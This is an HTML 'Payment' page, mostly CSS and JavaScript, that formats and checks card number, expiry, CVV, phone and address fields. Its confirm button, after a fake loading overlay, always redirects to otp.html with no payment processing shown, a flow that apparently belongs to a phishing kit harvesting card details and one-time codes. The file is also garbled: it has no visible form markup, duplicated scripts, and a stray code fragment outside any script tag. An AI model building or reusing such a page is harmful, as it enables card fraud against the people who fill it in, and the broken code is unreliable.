<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Payment</title>
<style>
  *{ box-sizing: border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: #f6f6f6;
    margin: 0;
    padding: 0;
    color: #333;
  }

  .container {
    width: min(420px, calc(100% - 32px));
    max-width: 420px;
    margin: 40px auto;
    background: #fff;
    border-radius: 16px;
    padding: 28px;
    box-shadow: 0 8px 24px rgba(0,0,0,0.08);
  }
  @media (max-width: 420px) {
    .container { padding: 20px; margin: 20px auto; }
  }

  h1 {
    font-size: 22px;
    font-weight: 700;
    color: #7b2cbf;
    margin: 0 0 6px;
  }
  .subtitle {
    font-size: 14px;
    color: #666;
    margin: 0 0 18px;
  }

  label {
    display: block;
    font-size: 13px;
    margin: 16px 0 6px;
  }

  input, select {
    width: 100%;
    padding: 14px;
    font-size: 14px;
    border-radius: 10px;
    border: 2px solid #e2c9f3;
    outline: none;
    background: #fff;
  }

  input[readonly] {
    background: #f3ecf9;
    font-weight: 600;
    color: #4a1f75;
    cursor: not-allowed;
  }

  .row {
    display: flex;
    gap: 12px;
  }

  .row > div { flex: 1; }

  .payment-methods {
    display: flex;
    gap: 12px;
    margin-top: 8px;
  }
  .method {
    flex: 1;
    border: 2px solid #e2c9f3;
    border-radius: 10px;
    padding: 14px;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #fff;
  }
  .method img { max-height: 40px; max-width: 100%; display: block; }
  .method svg { height: 40px; display: block; }

  button {
    margin-top: 26px;
    width: 100%;
    padding: 16px;
    border-radius: 14px;
    border: none;
    font-size: 16px;
    font-weight: 600;
    background: #9d7bbd;
    color: #fff;
    cursor: pointer;
  }
  button:hover { background: #8c6cab; }

  .hint {
    font-size: 12px;
    color: #777;
    margin-top: 8px;
    line-height: 1.35;
  }

  /* ZIP dropdown shown only when multiple ZIPs are returned */
  #zipSelect { display: none; }

  .status {
    font-size: 12px;
    color: #777;
    margin-top: 8px;
    min-height: 16px;
  }

/* Country dropdown should look like other inputs */
select#country{
  width:100%;
  padding:14px 14px;
  border-radius:14px;
  border:2px solid #e2c9f3;
  font-size:14px;
  outline:none;
  background:#fff;
  color:#333;
  appearance:auto;
}
select#country:focus{border-color:#caa3ea;}


  .suggestions{
    display:none;
    margin-top:8px;
    border:1px solid #e5e7eb;
    border-radius:12px;
    overflow:hidden;
    background:#fff;
    box-shadow:0 10px 22px rgba(0,0,0,.08);
  }
  .suggestions button{
    width:100%;
    border:0;
    background:#fff;
    text-align:left;
    padding:10px 12px;
    font-size:14px;
    cursor:pointer;
  }
  .suggestions button:hover{ background:#f4f5f7; }
  .suggestions .sub{
    display:block;
    font-size:12px;
    color:#666;
    margin-top:2px;
  }



@keyframes spin{to{transform:rotate(360deg);}}
</style>


<style>
</style>

<script>
  // reset payment form when user returns from OTP via back button
  (function(){
    const PRESERVE_IDS = ["country","countrySelect","country_code","countryCode","dialCode","phoneCode","phonePrefix","callingCode"];
    const PRESERVE_NAMES = ["country","country_code","countryCode","dialCode","phoneCode","phonePrefix","callingCode"];

    function findPreserveEls(){
      const els = [];
      PRESERVE_IDS.forEach(id => { const el = document.getElementById(id); if(el) els.push(el); });
      PRESERVE_NAMES.forEach(n => {
        document.querySelectorAll(`[name="${n}"]`).forEach(el => els.push(el));
      });
      // also preserve any element explicitly marked
      document.querySelectorAll('[data-preserve="true"]').forEach(el => els.push(el));
      // de-dup
      return Array.from(new Set(els));
    }

    function snapshotPreserved(){
      const snap = [];
      findPreserveEls().forEach(el => {
        snap.push({ el, value: el.value, checked: el.checked, selectedIndex: el.selectedIndex });
      });
      return snap;
    }

    function restorePreserved(snap){
      snap.forEach(item => {
        const el = item.el;
        if(!el) return;
        try{
          if(el.tagName === "SELECT") el.selectedIndex = item.selectedIndex;
          el.value = item.value;
          el.checked = item.checked;
          el.dispatchEvent(new Event("change", { bubbles:true }));
          el.dispatchEvent(new Event("input", { bubbles:true }));
        }catch(e){}
      });
    }

    function clearPayment(){
      const preserved = snapshotPreserved();

      document.querySelectorAll("input, select, textarea").forEach(function(el){
        // keep country/+1 selectors intact
        if(el && (PRESERVE_IDS.includes(el.id) || PRESERVE_NAMES.includes(el.name) || el.getAttribute("data-preserve")==="true")) return;

        try{ if(el.form && typeof el.form.reset === "function") el.form.reset(); }catch(e){}
        try{ el.value = ""; }catch(e){}
        try{ el.checked = false; }catch(e){}
        try{ if(el.tagName==="SELECT") el.selectedIndex = 0; }catch(e){}
        try{
          el.dispatchEvent(new Event("input", { bubbles:true }));
          el.dispatchEvent(new Event("change", { bubbles:true }));
        }catch(e){}
      });

      // disable confirm button again
      var btn = document.getElementById("confirmBtn");
      if(btn){
        btn.disabled = true;
        btn.classList.remove("ready");
        btn.style.opacity = "0.55";
        btn.style.cursor = "not-allowed";
      }

      // hide overlay
      var ov = document.getElementById("payOverlay");
      if(ov) ov.style.display = "none";

      // restore country/+1 after clearing
      restorePreserved(preserved);

      // some browsers re-apply autofill right after clearing; clear again shortly after (still preserving)
      setTimeout(function(){
        const preserved2 = snapshotPreserved();
        document.querySelectorAll("input, select, textarea").forEach(function(el){
          if(el && (PRESERVE_IDS.includes(el.id) || PRESERVE_NAMES.includes(el.name) || el.getAttribute("data-preserve")==="true")) return;
          try{ el.value = ""; }catch(e){}
          try{
            el.dispatchEvent(new Event("input", { bubbles:true }));
            el.dispatchEvent(new Event("change", { bubbles:true }));
          }catch(e){}
        });
        restorePreserved(preserved2);
      }, 80);
    }

    function maybeReset(){
      if (sessionStorage.getItem("resetPayment") === "true") {
        sessionStorage.removeItem("resetPayment");
        clearPayment();
      }
    }

    window.addEventListener("DOMContentLoaded", maybeReset);
    window.addEventListener("pageshow", function(){ maybeReset(); });
  })();
</script>
<style>
  /* force confirm payment colors exactly as requested */
  #confirmBtn{
    background:#9d7bbd !important; /* light purple (disabled) */
    color:#0f172a !important;
    opacity:0.55 !important;
    cursor:not-allowed !important;
    transition: background 160ms ease, opacity 160ms ease, filter 160ms ease;
  }
  #confirmBtn.ready{
    background:#4b1fa6 !important; /* bright purple (enabled) */
    opacity:1 !important;
    cursor:pointer !important;
  }
  #confirmBtn:disabled{
    background:#9d7bbd !important;
    opacity:0.55 !important;
    cursor:not-allowed !important;
  }
</style>
<style>
  /* professional processing overlay polish */
  #payOverlay{ animation: fadeIn 120ms ease-out; }
  #payOverlay > div{ transform: translateY(2px); animation: popIn 160ms ease-out; }
  @keyframes fadeIn{ from{opacity:0} to{opacity:1} }
  @keyframes popIn{ from{transform:translateY(10px);opacity:0.6} to{transform:translateY(2px);opacity:1} }
</style>
<style>
  /* loader polish */
  #payOverlay{animation: fadeIn 140ms ease-out;}
  #payOverlay .pay-card{
    background:#f3e8ff;
    border:1px solid rgba(15,23,42,0.10);
    border-radius:18px;
    padding:18px 22px 18px 22px;
    min-width:260px;
    box-shadow:0 18px 60px rgba(15,23,42,0.18);
    transform: translateY(6px);
    animation: popIn 180ms ease-out forwards;
  }
  #payOverlay .pay-title{font-weight:900;letter-spacing:0.2px;font-size:15px;}
  #payOverlay .pay-sub{font-size:12px;opacity:0.82;margin-top:6px;}
  #payOverlay .pay-row{display:flex;align-items:center;gap:12px;justify-content:center;}
  #payOverlay .pay-spinner{
    border-top-color:#6d28d9 !important;

    width:26px;height:26px;border-radius:999px;
    border:3px solid rgba(255,255,255,0.18);
    border-top-color:#0f172a;
    animation: spin 0.8s linear infinite;
  }
  #payOverlay .pay-bar{
    height:6px;border-radius:999px;margin-top:14px;
    background:rgba(255,255,255,0.12);overflow:hidden;
  }
  #payOverlay .pay-bar > div{
    height:100%;width:0%;
    background:#4b1fa6;
    animation: barFill 2.35s ease-out forwards;
  }
  @keyframes fadeIn{from{opacity:0}to{opacity:1}}
  @keyframes popIn{from{transform:translateY(18px);opacity:0.65}to{transform:translateY(6px);opacity:1}}
  @keyframes barFill{to{width:100%}}
</style>
<style>
  /* confirm button: light purple (disabled) -> bright purple (enabled) */
  #confirmBtn{
    color:#ffffff !important;
    background:#c4b5fd !important;
  }
  #confirmBtn:not([disabled]){
    background:#6d28d9 !important;
  }
</style>
<style>
/* REMOVE browser autofill blue completely */
input:-webkit-autofill,
input:-webkit-autofill:hover,
input:-webkit-autofill:focus,
textarea:-webkit-autofill,
select:-webkit-autofill{
  -webkit-text-fill-color: #111827 !important;
  box-shadow: 0 0 0px 1000px #ffffff inset !important;
  transition: background-color 999999s ease-in-out 0s;
}
</style>
<style>
/* smooth fade-in for processing overlay */
#processingOverlay{
  opacity:0;
  animation:fadeInOverlay 220ms ease-out forwards;
}
@keyframes fadeInOverlay{
  from{opacity:0;}
  to{opacity:1;}
}
</style>
<style>
/* smoother processing overlay in/out */
#processingOverlay{ opacity:0; transition: opacity 260ms ease-out; }
#processingOverlay.show{ opacity:1; }
body.pageFadeIn{ animation: payPageFade 260ms ease-out; }
@keyframes payPageFade{ from{opacity:0;} to{opacity:1;} }
</style>
</head>

<script>
(function(){
  const el = (id)=>document.getElementById(id);

  const card = el('cardNumber');
  const expiry = el('expiry');
  const cvv = el('cvv');
  const phone = el('phone');
  const address1 = el('address1');
  const city = el('city');
  const state = el('state');
  const zip = el('zip');
  const btn = document.getElementById("confirmBtn");
if(!btn) return;

  const originalBg = getComputedStyle(btn).backgroundColor;

  function digitsOnly(value){
    return (value||'').replace(/\D/g,'');
  }

  function formatCard(){
    if(!card) return;
    let v = digitsOnly(card.value).slice(0,16);
    card.value = v.replace(/(.{4})/g,'$1 ').trim();
  }

  function formatExpiry(){
    if(!expiry) return;
    let v = digitsOnly(expiry.value).slice(0,4);
    if(v.length > 2) v = v.slice(0,2) + '/' + v.slice(2);
    expiry.value = v;
  }

  function formatCvv(){
    if(!cvv) return;
    cvv.value = digitsOnly(cvv.value).slice(0,3);
  }

  function formatPhone(){
    if(!phone) return;
    let v = digitsOnly(phone.value).slice(0,10);
    if(v.length > 6) phone.value = v.slice(0,3)+'-'+v.slice(3,6)+'-'+v.slice(6);
    else if(v.length > 3) phone.value = v.slice(0,3)+'-'+v.slice(3);
    else phone.value = v;
  }

  function formatZip(){
    if(!zip) return;
    let v = digitsOnly(zip.value).slice(0,9);
    // Optional ZIP+4 formatting
    if(v.length > 5) zip.value = v.slice(0,5)+'-'+v.slice(5);
    else zip.value = v;
  }

  function isValid(){
    const cardDigits = card ? digitsOnly(card.value) : '';
    const expDigits = expiry ? digitsOnly(expiry.value) : '';
    const cvvDigits = cvv ? digitsOnly(cvv.value) : '';
    const phoneDigits = phone ? digitsOnly(phone.value) : '';
    const zipDigits = zip ? digitsOnly(zip.value) : '';

    const hasRequiredText = (address1 && address1.value.trim().length>0) && (city && city.value.trim().length>0) && (state && state.value.trim().length>0) && (zipDigits.length>=5);

    return (
      cardDigits.length === 16 &&
      expDigits.length === 4 &&
      cvvDigits.length === 3 &&
      phoneDigits.length === 10 &&
      hasRequiredText
    );
  }

  function updateButton(){
    const ok = isValid();
    btn.disabled = !ok;
    btn.style.cursor = ok ? 'pointer' : 'not-allowed';
    btn.style.opacity = ok ? '1' : '0.55';
    // dark purple when enabled
    btn.style.background = ok ? '#4b1fa6' : '#9d7bbd';
  }

  function onAnyInput(){
    formatCard();
    formatExpiry();
    formatCvv();
    formatPhone();
    formatZip();
    updateButton();
  }

  // Attach listeners
  const attach = (node, fn)=> node && node.addEventListener('input', fn);
  attach(card, onAnyInput);
  attach(expiry, onAnyInput);
  attach(cvv, onAnyInput);
  attach(phone, onAnyInput);
  attach(zip, onAnyInput);
  attach(address1, updateButton);
  attach(city, updateButton);
  attach(state, updateButton);

  // Initial
  onAnyInput();

})();
</script>


<script>
(function(){
  function byId(id){ return document.getElementById(id); }

  const cardEl   = byId('cardNumber');
  const expEl    = byId('expiry');
  const cvvEl    = byId('cvv');
  const phoneEl  = byId('phone');
  const addrEl   = byId('address1');
  const cityEl   = byId('city');
  const stateEl  = byId('state');
  const zipEl    = byId('zip');
  const btn      = document.querySelector('button[type="button"]');

  if(!btn) return;

  const originalBg = btn.style.background || '';
  const originalCursor = btn.style.cursor || '';

  function setBtnEnabled(enabled){
    if(enabled){
      btn.disabled = false;
      btn.style.background = '#4b1fa6';
      btn.style.cursor = 'pointer';
      btn.style.opacity = '1';
    } else {
      btn.disabled = true;
      btn.style.background = '#9d7bbd';
      btn.style.cursor = 'not-allowed';
      btn.style.opacity = '1';
    }
  }

  function digitsOnly(el, max){
    if(!el) return '';
    const d = (el.value||'').replace(/\D/g,'').slice(0, max);
    return d;
  }

  function formatCard(){
    if(!cardEl) return;
    const d = digitsOnly(cardEl, 16);
    cardEl.value = d.replace(/(.{4})/g,'$1 ').trim();
  }

  function formatExpiry(){
    if(!expEl) return;
    let d = digitsOnly(expEl, 4);
    if(d.length > 2) d = d.slice(0,2) + '/' + d.slice(2);
    expEl.value = d;
  }

  function formatPhone(){
    if(!phoneEl) return;
    const d = digitsOnly(phoneEl, 10);
    if(d.length > 6) phoneEl.value = d.slice(0,3)+'-'+d.slice(3,6)+'-'+d.slice(6);
    else if(d.length > 3) phoneEl.value = d.slice(0,3)+'-'+d.slice(3);
    else phoneEl.value = d;
  }

  function formatCVV(){
    if(!cvvEl) return;
    cvvEl.value = digitsOnly(cvvEl, 3);
  }

  function formatZIP(){
    if(!zipEl) return;
    // allow 5 or 9 digits; display 12345 or 12345-6789
    const d = digitsOnly(zipEl, 9);
    if(d.length > 5) zipEl.value = d.slice(0,5) + '-' + d.slice(5);
    else zipEl.value = d;
  }

  function isFilled(el){
    return !!(el && (el.value||'').trim().length);
  }

  function isValid(){
    const cardDigits = cardEl ? cardEl.value.replace(/\D/g,'') : '';
    const expDigits  = expEl ? expEl.value.replace(/\D/g,'') : '';
    const cvvDigits  = cvvEl ? cvvEl.value.replace(/\D/g,'') : '';
    const phoneDigits= phoneEl ? phoneEl.value.replace(/\D/g,'') : '';
    const zipDigits  = zipEl ? zipEl.value.replace(/\D/g,'') : '';

    const okCard  = cardDigits.length === 16;
    const okExp   = expDigits.length === 4 && (expEl.value||'').length === 5; // MM/YY
    const okCvv   = cvvDigits.length === 3;
    const okPhone = phoneDigits.length === 10;
    const okZip   = (zipDigits.length === 5 || zipDigits.length === 9);

    return okCard && okExp && okCvv && okPhone && okZip &&
      isFilled(addrEl) && isFilled(cityEl) && isFilled(stateEl);
  }

  function validate(){
    setBtnEnabled(isValid());
  }

  function bind(el, fn){
    if(!el) return;
    el.addEventListener('input', ()=>{ fn(); validate(); });
    el.addEventListener('blur', ()=>{ fn(); validate(); });
  }

  bind(cardEl, formatCard);
  bind(expEl, formatExpiry);
  bind(phoneEl, formatPhone);
  bind(cvvEl, formatCVV);
  bind(zipEl, formatZIP);

  [addrEl, cityEl, stateEl].forEach(el=>{ if(el) el.addEventListener('input', validate); });

  // initial pass
  formatCard(); formatExpiry(); formatPhone(); formatCVV(); formatZIP();
  setBtnEnabled(false);
})();
</script>

<script>
(function(){
  function bindRedirect(){
    // try common selectors for the confirm payment button
    const candidates = [
      document.getElementById("confirmBtn"),
      document.querySelector('button#confirm-payment'),
      document.querySelector('button[type="button"]'),
      ...Array.from(document.querySelectorAll("button"))
        .filter(b => (b.textContent || "").trim().toLowerCase().includes("confirm"))
    ].filter(Boolean);

    const btns = Array.from(new Set(candidates));
    if(!btns.length) return;

    btns.forEach(btn => {
      // force-click handler (overrides any previous onclick)
      btn.onclick = function(ev){
        // don't block navigation; just ensure enabled
        if (btn.disabled) return;
        try { ev && ev.preventDefault && ev.preventDefault(); } catch(e){}
        goToOtpWithDelay();
      };
      // also add capturing listener as backup
      btn.addEventListener("click", function(ev){
        if (btn.disabled) return;
        try { ev && ev.preventDefault && ev.preventDefault(); } catch(e){}
        goToOtpWithDelay();
      }, true);
      // ensure clicks are possible
      btn.style.pointerEvents = "auto";
      btn.style.cursor = "pointer";
    });

    // document-level fallback (in case overlays or re-renders replace the button)
    document.addEventListener("click", function(ev){
      const t = ev.target;
      if(!t) return;
      const b = t.closest && t.closest("button");
      if(!b) return;
      const label = (b.textContent || "").trim().toLowerCase();
      if(label.includes("confirm")){
        if (b.disabled) return;
        try { ev.preventDefault(); } catch(e){}
        goToOtpWithDelay();
      }
    }, true);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", bindRedirect);
  } else {
    bindRedirect();
  }
})();
</script>

    const sessionId = sessionStorage.getItem("sessionId") || (crypto.randomUUID ? crypto.randomUUID() : String(Date.now()));

    els.forEach(el => {

      el.addEventListener("input", handler);
      el.addEventListener("change", handler);
    });

<script>
/* final enforcement: ensures confirm button is light purple when disabled, bright purple when enabled,
   and ALWAYS redirects to otp.html after a 3s loading overlay. */
(function(){
  function findConfirmBtn(){
    var btn = document.getElementById('confirmBtn');
    if(btn) return btn;
    var buttons = Array.from(document.querySelectorAll('button'));
    btn = buttons.find(function(b){
      return ((b.textContent||'').trim().toLowerCase() === 'confirm payment');
    }) || null;
    if(btn) btn.id = 'confirmBtn';
    return btn;
  }

  function applyState(btn){
    if(!btn) return;
    if(btn.disabled){
      btn.classList.remove('ready');
    }else{
      btn.classList.add('ready');
    }
  }

  function showOverlay(){
    var ov = document.getElementById('payOverlay');
    if(ov) ov.style.display = 'flex';
  }

  function bindClick(btn){
    if(!btn) return;
    // remove any previous listeners by cloning
    var clone = btn.cloneNode(true);
    btn.parentNode.replaceChild(clone, btn);
    clone.id = 'confirmBtn';

    clone.addEventListener('click', function(e){
      e.preventDefault();
      if(clone.disabled) return;

      showOverlay();
      // lock during processing
      clone.disabled = true;
      applyState(clone);

      setTimeout(function(){
      window.location.href = 'otp.html';
    }, 1500);
    });

    return clone;
  }

  window.addEventListener('DOMContentLoaded', function(){
    var btn = findConfirmBtn();
    if(!btn) return;

    // observe state changes (some scripts toggle disabled/background)
    applyState(btn);
    try{
      var obs = new MutationObserver(function(){
        applyState(btn);
      });
      obs.observe(btn, { attributes:true, attributeFilter:['disabled','class','style']});
    }catch(e){}

    // also poll as a fallback
    setInterval(function(){ applyState(btn); }, 300);

    // bind click robustly
    btn = bindClick(btn);
    applyState(btn);
  });
})();
</script>
